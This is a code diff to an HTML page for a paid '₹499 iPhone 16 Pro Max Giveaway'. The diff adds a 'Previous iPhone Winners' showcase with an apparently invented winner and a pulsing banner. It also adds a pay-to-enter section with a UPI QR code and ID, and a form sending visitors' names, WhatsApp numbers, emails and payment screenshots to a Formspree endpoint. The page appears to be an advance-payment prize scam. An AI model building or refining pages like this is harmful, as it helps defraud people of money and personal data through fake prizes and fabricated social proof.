@@ -7,6 +7,49 @@
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
+    <div id="winner-section" style="padding: 40px; text-align: center; background: linear-gradient(135deg, #fff5e6, #ffdfba);">
+    <h2 class="winner-title">🎉 Previous iPhone Winners 🎉</h2>
+    <div class="winner-container" style="display: flex; justify-content: center; gap: 20px; overflow: hidden;">
+        <div class="winner-box">
+            <img src="https://cdn-icons-png.flaticon.com/512/3135/3135715.png" width="50" alt="user">
+            <h4>Ankit Sharma</h4>
+            <p>Code: GG-0052</p>
+            <span class="prize-tag">iPhone 15 Pro</span>
+        </div>
+    </div>
+</div>
+
+<style>
+    .winner-title {
+        font-size: 28px;
+        color: #d35400;
+        animation: pulse 2s infinite;
+    }
+    .winner-box {
+        background: white;
+        padding: 20px;
+        border-radius: 15px;
+        box-shadow: 0 10px 20px rgba(0,0,0,0.1);
+        border: 2px solid #f39c12;
+        transition: transform 0.3s;
+    }
+    .winner-box:hover {
+        transform: scale(1.05);
+    }
+    .prize-tag {
+        background: #27ae60;
+        color: white;
+        padding: 5px 10px;
+        border-radius: 5px;
+        font-size: 12px;
+    }
+    @keyframes pulse {
+        0% { transform: scale(1); }
+        50% { transform: scale(1.05); }
+        100% { transform: scale(1); }
+    }
+        </style>
+    
     <section id="hero">
         <h1>Rs499 iPhone 16 Pro Max Giveaway</h1>
         <p>Enter for a chance to win big! Pay ₹499 to join the fun.</p>
@@ -86,35 +129,37 @@
         </div>
     </section>
 
-    <section id="entry">
-        <h2>Enter the Giveaway</h2>
-        <form id="entry-form">
-            <div class="form-group">
-                <label for="name">Name</label>
-                <input type="text" id="name" required>
-            </div>
-            <div class="form-group">
-                <label for="mobile">Mobile Number</label>
-                <input type="tel" id="mobile" required>
-            </div>
-            <div class="form-group">
-                <label for="upi-id">
-                    UPI Transaction ID 
-                    <a href="Transaction id.png" target="_blank" class="help-icon" title="Where to find Transaction ID?">?</a>
-                </label>
-                <input type="text" id="upi-id" required placeholder="Enter 12-digit ID">
-            </div>
-            <button type="submit" class="gold-button">Submit Entry</button>
-        </form>
+<section id="payment-submission" style="padding: 30px; background: #fff; border-radius: 10px; max-width: 500px; margin: 40px auto; box-shadow: 0 0 15px rgba(0,0,0,0.2); font-family: 'Arial', sans-serif;">
+    
+    <h3 style="text-align: center; color: #333; font-size: 24px;">Join the Giveaway</h3>
+    <p style="font-size: 14px; color: #e74c3c; text-align: center; font-weight: bold;">Step 1: Scan the QR below and pay ₹499. <br> Step 2: Fill out this form with your payment screenshot.</p>
+    
+    <div style="text-align: center; margin: 20px 0; padding: 15px; border: 1px dashed #f39c12; border-radius: 10px;">
+        <h4 style="margin-bottom: 10px;">Scan to Pay (₹499)</h4>
+        <img src="Qrcode.jpg" alt="Payment QR Code" width="220" style="border-radius: 5px;">
+        <p style="margin-top: 10px;"><strong>UPI ID:</strong> <span style="color: #2980b9;">Q258020709@ybl</span></p>
+    </div>
 
-        <div id="payment">
-            <h3>Payment Details</h3>
-            <p><strong>UPI ID:</strong> Q258026703@ybl</p>
-            <div class="qr-container">
-                <h3>Scan to Pay</h3>
-                <img src="Qrcode.jpg" alt="Payment QR Code" width="250">
-            </div>
-        </div>
+    <form action="https://formspree.io/f/mzdggroe" method="POST" enctype="multipart/form-data" style="display: flex; flex-direction: column;">
+        
+        <label style="font-weight: bold; margin-bottom: 5px;">Full Name:</label>
+        <input type="text" name="name" placeholder="Enter your full name" required style="padding: 10px; margin-bottom: 15px; border: 1px solid #ccc; border-radius: 5px;">
+        
+        <label style="font-weight: bold; margin-bottom: 5px;">WhatsApp Number:</label>
+        <input type="tel" name="phone" placeholder="Enter WhatsApp number for Unique Code" required style="padding: 10px; margin-bottom: 15px; border: 1px solid #ccc; border-radius: 5px;">
+        
+        <label style="font-weight: bold; margin-bottom: 5px;">Email Address:</label>
+        <input type="email" name="_replyto" placeholder="Enter your email" required style="padding: 10px; margin-bottom: 15px; border: 1px solid #ccc; border-radius: 5px;">
+        
+        <label style="font-weight: bold; margin-bottom: 5px;">Upload Payment Screenshot:</label>
+        <input type="file" name="upload" accept="image/*" required style="margin-bottom: 20px;">
+        
+        <button type="submit" style="padding: 15px; background: #27ae60; color: white; border: none; cursor: pointer; border-radius: 5px; font-size: 18px; font-weight: bold; transition: 0.3s;">
+            Submit & Claim My Code
+        </button>
+    </form>
+</section>
+    
     </section>
 
     <section class="card">
